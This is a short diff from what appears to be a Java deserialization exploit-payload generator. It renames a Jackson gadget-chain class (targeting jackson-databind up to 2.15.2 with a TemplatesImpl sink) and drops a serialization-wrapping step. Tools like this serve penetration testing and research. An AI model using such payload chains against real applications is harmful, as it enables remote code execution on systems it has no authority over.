@@ -30,21 +30,15 @@ import java.util.HashMap;
 @Dependencies({"com.fasterxml.jackson.core:jackson-databind:<=2.15.2", "org.springframework:spring-aop:x"})
 @Authors({Authors.COKEBEER})
 @Sink({Sink.TemplatesImpl})
-public class Jackson_2 implements ObjectPayload<Object> {
+public class Jackson2 implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(Jackson_2.class, args);
+        PayloadRunner.run(Jackson2.class, args);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
         // sink
         Object sinkObject = SinkScheduler.builder(sinksHelper);
-
-        // wrap
-        if (sinksHelper.getWrapSerialization() != null) {
-            Object o = WrapSerialization.scheduler(sinkObject, sinksHelper);
-            sinkObject = (o != null) ? o : sinkObject;
-        }
 
         Object kickOffObject = getChain(sinkObject);
 
